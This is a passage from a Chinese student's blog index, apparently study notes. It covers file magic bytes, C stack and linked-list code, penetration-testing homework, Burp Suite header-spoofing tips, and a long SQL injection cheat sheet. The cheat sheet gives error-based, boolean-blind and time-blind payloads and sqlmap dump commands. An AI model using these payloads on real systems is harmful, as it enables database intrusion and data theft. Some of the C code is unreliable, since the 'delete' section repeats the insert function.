文件尾：50 4BRAR Archive (rar) 文件头：52 61 72 214、音频文件Wave (wav) 文件头：57 41 56 45audio(Audio) 文件头： 4D 54 68 64audio/x-aac（aac）文件头：FF F1(9)5、视频文件AVI (avi) 文件头：41 56 49 20Real Audio (ram) 文件头：2E 72 61 FDReal Media (rm) 文件头：2E 52 4D 46MPEG (mpg) 文件头：00 00 01 BA(3)Quicktime (mov) 文件头：6D 6F 6F 76Windows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11MIDI (mid) 文件头：4D 54 68 646、代码文件XML (xml) 文件头：3C 3F 78 6D 6CHTML (html) 文件头：68 74 6D 6C 3EQuicken (qdf) 文件头：AC 9E BD 8FWindows Password (pwl) 文件头：E3 82 85 967、其他类型windows证书文件(der) 文件头：30 82 03 C9CAD (dwg) 文件头：41 43 31 30Windows Shortcut (lnk) 文件头：4C 00 00 00Windows reg(reg) 文件头：52 45 47 45 44 49 54 34 8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。回答：隐藏信息为tom is the kille-. 8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。 回答：下载一定的软件即可恢复 9、讨论学校热点GUET-WiFi的安全问题，以截图说明。 10、实验小结实验报告小结需要描述Ethical Hacking的理解。 我对Ethical Hacking的理解：我对道德黑客的理解是指通过授权且合法的方式，以保护和提升网络安全为目标的技术活动。道德黑客是一群具备专业知识和技能的安全专家，他们通过模拟攻击和漏洞测试来评估系统和网络的安全性。他们的主要目的是发现潜在的安全风险，并向组织提供建议和解决方案来增强其安全性。 道德黑客与恶意黑客有着明显的区别，他们严格遵守法律和道德准则，并通过与组织合作的方式来执行其任务。他们的活动是经过授权的，通常在组织的请求下进行，以保护系统免受潜在的攻击和数据泄露。 道德黑客的工作范围包括对网络、应用程序和系统进行漏洞扫描、渗透测试、安全评估等活动。他们利用类似黑客攻击的技术手段来发现漏洞，然后向组织报告这些漏洞以及相应的修复建议。 总而言之，道德黑客的目标是通过帮助组织发现并修复安全漏洞，提高网络和系统的安全性，从而保护用户的数据和隐私。他们在维护网络安全方面发挥着重要的作用。 1.向网络上传个人照片时，若不想暴露个人位置，需要对照片的关键信息打上马赛克。 2.通过LAC码和CID码，可以初步确定手机用户的位置，所以自己手机的LAC和CID码不应该随便让其他人知道。 3.利用一定软件可以进行编码解码。注意：如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。 4.当文件打不开时，可以利用winhex进行修复","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"栈","slug":"栈","date":"2023-12-08T09:41:14.018Z","updated":"2023-12-08T10:56:02.578Z","comments":true,"path":"2023/12/08/栈/","permalink":"http://example.com/2023/12/08/%E6%A0%88/","excerpt":"","text":"类型定义123456struct Node&#123; int data; struct Node *next;&#125;; typedef struct Node * PNode;typedef struct Node * top, * LinkStack; 创建空栈1234567LinkStack SetNullStack_link()&#123; LinkStack top=(LinkStack)malloc(sizeof(struct Node)); if(top!=NULL) top-&gt;next=NULL; else printf(&quot;创建空栈失败\\n&quot;); return top;&#125; 判空12345int IsNullStack_Link(LinkStack top)&#123; if(top-&gt;next==NULL) return 1; return 0;&#125; 进栈1234567891011void Push_link(LinkStack top,int x)&#123; PNode p; p=(PNode)malloc(sizeof(struct Node)); if(p==NULL) printf(&quot;进栈创建失败\\n&quot;); else&#123; p-&gt;data=x; p-&gt;next=top-&gt;next; top-&gt;next=p; &#125;&#125; 取栈顶12345int Top_link(LinkStack top) &#123; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else return top-&gt;next-&gt;data; &#125; 出栈12345678910void Pop_link(LinkStack top)&#123; PNode p; if(IsNullStack_Link(top)) printf(&quot;此栈为空\\n&quot;); else&#123; p=top-&gt;next; top-&gt;next=p-&gt;next; free(p); &#125;&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"链表","slug":"链表","date":"2023-12-08T07:59:27.246Z","updated":"2023-12-08T08:44:25.250Z","comments":true,"path":"2023/12/08/链表/","permalink":"http://example.com/2023/12/08/%E9%93%BE%E8%A1%A8/","excerpt":"","text":"单链表类型定义1234567typedef int DataType;struct Node&#123; DataType data; //数据域 struct Node* next; //指针域 &#125;;typedef struct Node* PNode; //节点类型定义 typedef struct Node* LinkList; //单链表类型定义 创建链表1234567LinkList SetNullList_Link() &#123; LinkList head = (LinkList)malloc(sizeof(struct Node)); if (head != NULL) head-&gt;next = NULL; else printf(&quot;alloc failure&quot;); return head; &#125; 头插法12345678910111213141516void CreateList_Head(struct Node* head) //用头插法创建单链表 &#123; PNode p=NULL; //临时使用 int data; printf(&quot; 头插法，请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //对数据域赋值 p -&gt;next = head -&gt;next; //对next域赋值 head -&gt; next =p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 尾插法123456789101112131415161718void CreateList_Tail(struct Node* head) //用尾插法建立链表 &#123; struct Node* p=NULL; struct Node* q=head; int data; printf(&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\\n&quot;); scanf(&quot;%d&quot;,&amp;data); while(data!=-1) &#123; p=(struct Node*)malloc(sizeof(struct Node)); //分配空间 p -&gt; data=data; //数据域赋值 p -&gt;next =NULL; //指针域赋值 q -&gt;next =p; q=p; scanf(&quot;%d&quot;,&amp;data); &#125;&#125; 输出链表123456789void print(LinkList head)&#123; PNode p=head -&gt; next; while(p) &#123; printf(&quot;%d\\n&quot;,p -&gt; data); p=p-&gt;next; &#125; 插入算法1234567891011121314151617181920212223//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素int InsertPost_link(LinkList llist,DataType x,DataType y)&#123; PNode p =llist; PNode Newp=(PNode)malloc(sizeof(struct Node)); Newp -&gt; data=y; Newp -&gt; next =NULL; while(p!=NULL)&#123; if (p -&gt; data==x) &#123; Newp -&gt; next=p -&gt; next; p -&gt;next =Newp; return 1; &#125; else&#123; p=p -&gt;next; &#125; &#125; printf(&quot;not exist data %d\\n&quot;,x); return 1;&#125; 删除算法12345678910111213141516171819void DelNode_Link(LinkList head,int deldata)&#123; if(head==NULL)return 1; PNode prees=head; PNode current=head -&gt; next; while(current)&#123; if(current -&gt; data == deldata) &#123; prees -&gt; next = current -&gt; next; free(current); return 1; &#125; else &#123; prees=current; current=current -&gt;next; &#125; &#125; printf(&quot;not exist %d\\n&quot;,deldata);&#125; 循环链表123456789101112131415161718//将尾结点连接到头结点PNode buildCircularLinkedList(int n, PNode tail)&#123; PNode current=NULL, prev; prev = tail; for (int i = 0; i &lt; n; i++) &#123; current = (PNode)malloc(sizeof(Node)); current-&gt;next = NULL; scanf(&quot;%d&quot;, &amp;current-&gt;data); prev-&gt;next = current; prev = current; &#125; current-&gt;next = tail-&gt;next; tail-&gt;next = current; return tail;&#125; 双链表类型定义1234567struct Node&#123; int data; struct Node* pre; struct Node* next;&#125;;typedef struct Node* LinkList;typedef struct Node* PNode; 创建链表12345678LinkList SetList_Link()&#123; LinkList head=(LinkList)malloc(sizeof(struct Node)); head-&gt;data=0; head-&gt;pre=NULL; head-&gt;next=NULL; return head;&#125; 头插法123456789101112void HeadInsert(LinkList head,int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;pre = head; newNode-&gt;next = head-&gt;next; if(head-&gt;next != NULL) &#123; head-&gt;next-&gt;pre = newNode; &#125; head-&gt;next = newNode; &#125; 尾插法12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 输出链表12345678910void PrintList(LinkList head)&#123; LinkList PrintList=head-&gt;next; while(PrintList) &#123; printf(&quot;%d-&gt;&quot;,PrintList-&gt;data); PrintList=PrintList-&gt;next; &#125; printf(&quot;NULL\\n&quot;);&#125; 删除12345678910111213void TailInsert(LinkList head, int data)&#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = NULL; PNode p = head; while (p-&gt;next != NULL) &#123; p = p-&gt;next; &#125; newNode-&gt;pre = p; p-&gt;next = newNode;&#125; 插入算法1234567891011121314151617181920212223void InsertAfterElement(LinkList head, int target, int data)&#123; PNode p = head-&gt;next; while (p != NULL) &#123; if (p-&gt;data == target) &#123; PNode newNode = (PNode)malloc(sizeof(struct Node)); newNode-&gt;data = data; newNode-&gt;next = p-&gt;next; if (p-&gt;next != NULL) &#123; p-&gt;next-&gt;pre = newNode; &#125; newNode-&gt;pre = p; p-&gt;next = newNode; head-&gt;data++; return; &#125; p = p-&gt;next; &#125; printf(&quot;Target element not found\\n&quot;);&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"作业No2","slug":"作业2","date":"2023-12-06T03:17:46.631Z","updated":"2023-12-08T07:03:03.745Z","comments":true,"path":"2023/12/06/作业2/","permalink":"http://example.com/2023/12/06/%E4%BD%9C%E4%B8%9A2/","excerpt":"","text":"题目汇总1.与ZoomEye功能类似的搜索引擎还有哪些？ 2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。 3.子域名收集，截图。 题目1与ZoomEye功能类似的搜索引擎还有哪些？ 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括： Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。 BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。 Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。 Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。 题目2利用ZoomEye进行相关搜索，截图，发布到自己的Blog 回答：搜索 领势 Compact Wireless-G 网络视频摄像机 http服务器 题目3子域名收集，截图。 回答：搜索 百度 的子域名","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"作业No1","slug":"作业1","date":"2023-12-05T05:32:57.310Z","updated":"2023-12-08T07:02:51.086Z","comments":true,"path":"2023/12/05/作业1/","permalink":"http://example.com/2023/12/05/%E4%BD%9C%E4%B8%9A1/","excerpt":"","text":"题目汇总1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？3、对于1、2的结果，进行总结分析。注：网络配置发生变化，建议重启网卡（操作命令见PPT）作业发布到自己blog备查。 题目1Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：不能 题目2Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？ 回答：能 题目3对于1、2的结果，进行总结分析。 回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"burpsuit使用","slug":"burpsuite使用","date":"2023-11-22T05:31:01.277Z","updated":"2023-12-08T11:28:40.816Z","comments":true,"path":"2023/11/22/burpsuite使用/","permalink":"http://example.com/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/","excerpt":"","text":"更改数据包get请求将请求改为如下 post请求使用POST提交方法和GET类似，将GET改为POST，在末尾添加b&#x3D;2，此时记得添加Content-Type: application&#x2F;x-www-form-urlencoded 伪造IP随便加一行： X-Forwarded-For:127.0.0.1X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1True-Client-Ip:127.0.0.1 伪造浏览器和设备修改User-Agent 伪造网址修改referer 密码爆破","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"SQL注入","slug":"sql注入","date":"2023-11-20T05:58:04.625Z","updated":"2023-12-21T11:18:21.069Z","comments":true,"path":"2023/11/20/sql注入/","permalink":"http://example.com/2023/11/20/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"MySQL操作登陆：1mysql -u [用户名] -p 查询用户名所有数据库：1show databases; 创建数据库：1create database [数据库名]； 删除数据库：1drop database [数据库名] ; 使用数据库：1use [数据库名]; 查询数据库中的表：show tables; 创建表：123456789create table [表名](id int;name varchar(40);) 更改数据表名：1rename table [原数据表名] to [新数据表名] 向数据表中插入数据：1insert into [数据表名] (id ,name,age) values (1,&quot;tom&quot; 19); 向数据表中擦插入新的列：1alter table [数据表名] [列名] [列的数据类型]； 更改数据表中的数据：123update [数据表名] set name=&quot;lisa&quot; where id=1;--修改id=1的行name为lisa 删除数据表中的列：1alter table [数据表名] drop [列名] 删除数据表中的行：123delete from [数据表名] where id=1;--删除id=1的行 查询数据表的包涵数据：123select *from [数据表名] where id in (‘3’)；--在数据表中查询id中包涵‘3’的数据 联合查询：123select country from [数据表名1] union select country from [数据表名2] order country;--查询数据表1和数据表2中不同的country 排序：123select * from users order by age asc;--asc升序，desc降序 注入：数字&#x2F;字符型注入：判断：1id=2-1 查询网站所用数据表列数：123select * from users where id=1 order by x;--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数 查询网站所用数据数据库123select * from users where id=&#x27;0&#x27; union select 1,2,database(),4;--select 后面的数量要与users列数相同 使用：1select group_concat(schema_name) from information_schema.schemata（查库） 1select group_concat(table_name) from information_schema.tables where table_schema=库名（查表) 1select group_concat(column_name) from information_schema.columns where table_schema=[数据库名] and table_name=[表名]（查列） 1select 列名 from 库名.表名（查数据) 报错注入extractvalue1234567查数据库名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))爆字段名：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))爆数据：id=&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) ① 0x7e&#x3D;’’ ② concat(‘a’,‘b’)&#x3D;“ab” ③ version()&#x3D;@@version ④ ‘‘可以换成’#’、’$’等不满足xpath格式的字符 ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 updatexml1234567爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e)) floor()：1234567爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a 布尔盲注当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果，这种情况就叫盲注。布尔型盲注就是利用返回的True或False来判断注入语句是否执行成功。它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 什么情况下考虑使用布尔盲注？ 1. 该输入框存在注入点。 2. 该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。 3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。 常用函数 1.length（str）函数 返回字符串的长度 2.substr（str,poc,len）截取字符串,poc表示截取字符串的开始位，len表示截取字符串的长度 3.ascii（）返回字符的ascii码，返回该字符对应的ascii码 4.count（）：返回当前列的数量 5.case when (条件) then 代码1 else 代码2 end :条件成立，则执行代码1，否则执行代码2 函数替换 12345678910111.如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样2.left（str，index）从左边第index开始截取3.right(str，index)从右边第index开始截取4.substring（str，index）从左边index开始截取5.mid（str，index，len）截取str从index开始，截取len的长度6.lpad（str，len，padstr）7.rpad（str，len，padstr）在str的左（右）两边填充给定的padstr到指定的长度len，返回填充的结果8.如果程序过滤了 = （等于号），可以用in()、like代替，效果一样：9.如果程序过滤了ascii（），可以用hex()、bin（）、ord()代替，效果一样： 布尔盲注一般流程 因为盲注不能直接用database（）函数得到数据库名，所以步骤如下： 12345①判断数据库名的长度：and length(database())&gt;11 回显正常；and length(database())&gt;12 回显错误，说明数据库名是等于12个字符。②猜测数据库名（使用ascii码来依次判断）：and (ascii(substr(database(),1,1)))&gt;100 --+ 通过不断测试，确定ascii值，查看asciii表可以得出该字符，通过改变database（）后面第一个数字，可以往后继续猜测第二个、第三个字母…③猜测表名：and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+ 往后继续猜测第二个、第三个字母…④猜测字段名（列名）：and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=’数据库表名’ limit 0,1)1,1)&gt;105 --+ 经过猜测 ascii为 105 为i 也就是表的第一个列名 id的第一个字母;同样,通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段.⑤猜测字段内容：因为知道了列名，所以直接 select password from users 就可以获取password里面的内容，username也一样 and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+ 时间盲注界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。时间盲注与布尔盲注类似。时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功。 什么情况下考虑使用时间盲注？ 无法确定参数的传入类型。整型，加单引号，加双引号返回结果都一样 不会回显注入语句执行结果，故无法使用UNION注入 不会显示报错信息，故无法使用报错注入 符合盲注的特征，但不属于布尔型盲注 常用函数 sleep(n)：将程序挂起一段时间 n为n秒。 if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句。 使用sleep()函数和if()函数：`and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) --+` 如果返回正确则 页面会停顿10秒，返回错误则会立马返回。只有指定条件的记录存在时才会停止指定的秒数。 时间盲注一般流程 123456789101112131415161718①猜测数据库名称长度：输入：id=1&#x27; and If(length(database()) &gt; 1,1,sleep(5))--+用时：&lt;1s，数据库名称长度&gt;1…输入：id=1&#x27; and If(length(database()) &gt;8 ,1,sleep(5))--+用时：5s，数据库名称长度=8得出结论：数据库名称长度等于8个字符。②猜测数据库名称的一个字符：输入：id=1&#x27; and If(ascii(substr(database(),1,1))=97,sleep(5),1)--+用时：&lt;1s…输入：id=1&#x27; and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+用时：5s得出结论：数据库名称的第一个字符是小写字母s。改变substr的值，以此类推第n个字母。最后猜出数据库名称。③猜测数据库表名：先猜测长度，与上面内容相似。④猜测数据库字段：先猜测长度，与上面内容相似。⑤猜测字段内容：先猜测长度，与上面内容相似。 sqlmap使用：指定位置注入1、-p，指定具体探测的参数 123sqlmap -u url -p id --dbs --对id进行探测 123sqlmap -u url -p &quot;id,name&quot; --dbs --对id和name都进行探测 2、–skip，忽略探测的参数 123sqlmap -u url --level 5 --skip host --dbs --5级对所有存在的注入点进行探测，这里忽略了host get型1、查看所有「数据库」 1sqlmap -u &#x27;http://xx/?id=1&#x27; --dbs 2.查看「数据表」 1sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] --tables 3.查看「数据」 1sqlmap -u &#x27;http://xx/?id=1&#x27; -D [数据库名] -T [数据库表名] --dump post型1.使用bp抓包并标注注入点（在后面加*） 复制数据包内容到kali并保存为文档 使用sqlmap注入 12sqlmap -r 1.txt --dbs 12sqlmap -r 1.txt -D pikachu --tables 余下步骤与get型一样","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"},{"name":"错误解决","slug":"错误解决","permalink":"http://example.com/categories/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"SQL","slug":"开发/SQL","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/SQL/"},{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"},{"name":"语法","slug":"开发/python/语法","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E8%AF%AD%E6%B3%95/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"},{"name":"靶场","slug":"安全/网络渗透测试/靶场","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"},{"name":"前端","slug":"开发/前端","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF/"},{"name":"数据结构","slug":"开发/数据结构","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"安全/网络渗透测试/作业","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"错误解决","slug":"错误解决","permalink":"http://example.com/tags/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"},{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"作业","slug":"作业","permalink":"http://example.com/tags/%E4%BD%9C%E4%B8%9A/"}]}